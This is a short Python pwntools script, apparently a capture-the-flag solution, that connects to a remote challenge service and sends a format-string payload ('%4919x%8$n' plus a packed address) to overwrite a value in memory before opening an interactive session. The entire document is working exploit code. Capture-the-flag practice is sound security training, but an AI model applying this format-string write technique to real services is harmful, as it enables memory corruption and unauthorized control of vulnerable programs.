from pwn import *

r = remote("pwf.ss2.ccit23.havce.it", 31352); 

r.recvuntil("string: ")

r.sendline(b"%4919x%8$nBBBBBB\x4c\x10\x60\x00\x00\x00\x00\x00")

r.interactive()